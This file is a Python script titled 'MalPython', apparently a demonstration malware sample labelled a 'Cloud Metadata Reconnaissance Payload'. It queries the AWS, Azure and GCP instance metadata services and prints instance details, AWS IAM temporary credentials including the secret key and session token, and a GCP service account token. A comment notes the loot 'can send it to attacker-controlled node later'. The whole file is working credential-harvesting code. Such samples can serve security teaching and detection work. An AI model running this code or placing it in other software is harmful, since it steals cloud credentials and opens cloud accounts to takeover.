# MalPython
#
# Cloud Metadata Reconnaissance
# Demonstrate how attackers enumerate cloud environment
# 1. querying AWS EC2 metadata service (169.254.169.254)
# 2. accessing AWS credentials and temporary tokens
# 3. discovering instance metadata and configuration
# 4. attempting Azure metadata service
# 5. attempting GCP metadata service
#
# This sample only print the result

from typing import Dict, Optional
import urllib.request
import urllib.error
import json
import sys


# AWS EC2 metadata service
AWS_METADATA_URL = "http://169.254.169.254/latest/meta-data"
AWS_TOKEN_URL = "http://169.254.169.254/latest/api/token"
AWS_DYNAMIC_URL = "http://169.254.169.254/latest/dynamic/instance-identity"

# Azure metadata service
AZURE_METADATA_URL = "http://169.254.169.254/metadata/instance"

# GCP metadata service
GCP_METADATA_URL = "http://metadata.google.internal/computeMetadata/v1"

# IMDSv2 token lifetime (seconds)
TOKEN_TTL = 21600


def get_aws_token() -> Optional[str]:
    """
    Get IMDSv2 token from AWS metadata service.

    IMDSv2 requires a token for security, but is easily obtained.
    """
    try:
        req = urllib.request.Request(
            AWS_TOKEN_URL,
            method="PUT",
            headers={"X-aws-ec2-metadata-token-ttl-seconds": str(TOKEN_TTL)},
        )
        with urllib.request.urlopen(req, timeout=2) as response:
            return response.read().decode()
    except (urllib.error.URLError, Exception):
        return None


def query_aws_metadata(path: str, token: Optional[str] = None) -> Optional[str]:
    """Query AWS metadata service."""
    try:
        url = f"{AWS_METADATA_URL}/{path}"
        req = urllib.request.Request(url)

        # Add token for IMDSv2 if available
        if token:
            req.add_header("X-aws-ec2-metadata-token", token)

        with urllib.request.urlopen(req, timeout=2) as response:
            return response.read().decode()

    except (urllib.error.URLError, Exception):
        return None


def enumerate_aws_metadata() -> Dict:
    """Enumerate all available AWS metadata."""
    results = {}

    print()
    print("[*] Attempting AWS Metadata Service...")

    # Attempting IMDSv2 first, fallback to IMDSv1
    token = get_aws_token()

    print("[*] Attempting to retrieve Instance information")

    # Basic metadata paths
    aws_paths = [
        ("Instance ID", "instance-id"),
        ("Instance Type", "instance-type"),
        ("Availability Zone", "placement/availability-zone"),
        ("Private IP", "local-ipv4"),
        ("Public IP", "public-ipv4"),
        ("MAC Address", "mac"),
        ("Hostname", "hostname"),
        ("IAM Role", "iam/security-credentials"),
        ("VPC ID", "vpc-id"),
        ("Subnet ID", "subnet-id"),
    ]

    # can send it to attacker-controlled node later
    for label, path in aws_paths:
        result = query_aws_metadata(path, token)
        if result:
            results[label] = result.strip()
            print(f"    ✓ {label}: {result.strip()[:60]}")

    # Attempt to enumerate IAM credentials
    iam_role = results.get("IAM Role")
    if iam_role:
        cred_path = f"iam/security-credentials/{iam_role}"
        cred_response = query_aws_metadata(cred_path, token)

        if cred_response:
            try:
                credentials = json.loads(cred_response)
                print(f"    ✓ Found IAM Credentials!")
                print(f"      - Access Key: {credentials.get('AccessKeyId')}")
                print(f"      - Secret Key: {credentials.get('SecretAccessKey')[:20]}...")
                print(f"      - Token: {credentials.get('Token')[:20] if credentials.get('Token') else 'N/A'}...")
                print(f"      - Expiration: {credentials.get('Expiration')}")

                results["IAM_Credentials"] = credentials

            except json.JSONDecodeError:
                pass

    # Query instance identity document
    print()
    print("[*] Attempting to retrieve Instance Identity Document...")

    try:
        url = f"{AWS_DYNAMIC_URL}/document"
        req = urllib.request.Request(url)
        if token:
            req.add_header("X-aws-ec2-metadata-token", token)

        with urllib.request.urlopen(req, timeout=2) as response:
            identity = json.loads(response.read().decode())
            print(f"    ✓ Instance Identity Document retrieved")
            print(f"      - Account ID: {identity.get('accountId')}")
            print(f"      - Region: {identity.get('region')}")
            print(f"      - ImageId: {identity.get('imageId')}")

            results["Instance_Identity"] = identity

    except (urllib.error.URLError, Exception):
        pass

    return results


def enumerate_azure_metadata() -> Dict:
    """Enumerate Azure metadata service."""
    results = {}

    print()
    print("[*] Attempting Azure Metadata Service...")

    try:
        url = f"{AZURE_METADATA_URL}?api-version=2021-02-01&format=json"
        req = urllib.request.Request(url, headers={"Metadata": "true"})

        with urllib.request.urlopen(req, timeout=2) as response:
            metadata = json.loads(response.read().decode())

            # Extract useful information
            compute = metadata.get("compute", {})
            network = metadata.get("network", {})

            azure_fields = [
                ("Subscription ID", ["compute", "subscriptionId"]),
                ("Resource Group", ["compute", "resourceGroupName"]),
                ("VM Name", ["compute", "name"]),
                ("Location", ["compute", "location"]),
                ("VM Size", ["compute", "vmSize"]),
            ]

            for label, path_list in azure_fields:
                try:
                    value = metadata
                    for key in path_list:
                        value = value[key]
                    print(f"    ✓ {label}: {value}")
                    results[label] = value
                except (KeyError, TypeError):
                    pass

    except (urllib.error.URLError, Exception):
        print("    ✗ Azure metadata service not accessible")

    return results


def enumerate_gcp_metadata() -> Dict:
    """Enumerate GCP metadata service."""
    results = {}

    print()
    print("[*] Attempting GCP Metadata Service...")

    try:
        gcp_paths = [
            ("Project ID", "project/project-id"),
            ("Instance Name", "instance/name"),
            ("Instance Zone", "instance/zone"),
            ("Instance ID", "instance/id"),
            ("Machine Type", "instance/machine-type"),
            ("Service Account Email", "instance/service-accounts/default/email"),
        ]

        for label, path in gcp_paths:
            try:
                url = f"{GCP_METADATA_URL}/{path}"
                req = urllib.request.Request(url, headers={"Metadata-Flavor": "Google"})

                with urllib.request.urlopen(req, timeout=2) as response:
                    result = response.read().decode().strip()
                    print(f"    ✓ {label}: {result}")
                    results[label] = result

            except (urllib.error.URLError, Exception):
                pass

        # Attempt to get service account identity token
        print()
        print("[*] Attempting to retrieve GCP Service Account Token...")

        try:
            sa_token_url = f"{GCP_METADATA_URL}/instance/service-accounts/default/identity?audience=https://www.googleapis.com"
            req = urllib.request.Request(sa_token_url, headers={"Metadata-Flavor": "Google"})

            with urllib.request.urlopen(req, timeout=2) as response:
                token = response.read().decode()
                print(f"    ✓ Service Account Token: {token[:50]}...")
                results["Service_Account_Token"] = token

        except (urllib.error.URLError, Exception):
            pass

    except (urllib.error.URLError, Exception):
        print("    ✗ GCP metadata service not accessible")

    return results



def main():
    """Run metadata reconnaissance."""

    print("[*] Cloud Metadata Reconnaissance Payload")
    print("[*] Querying cloud provider metadata services...")
    print()

    aws_results   = enumerate_aws_metadata()
    azure_results = enumerate_azure_metadata()
    gcp_results   = enumerate_gcp_metadata()

    # Summary
    print()
    print("[*] Summary:")
    print(f"  - AWS: {'✓' if aws_results else '✗'}")
    print(f"  - Azure: {'✓' if azure_results else '✗'}")
    print(f"  - GCP: {'✓' if gcp_results else '✗'}")

if __name__ == "__main__":
    main()
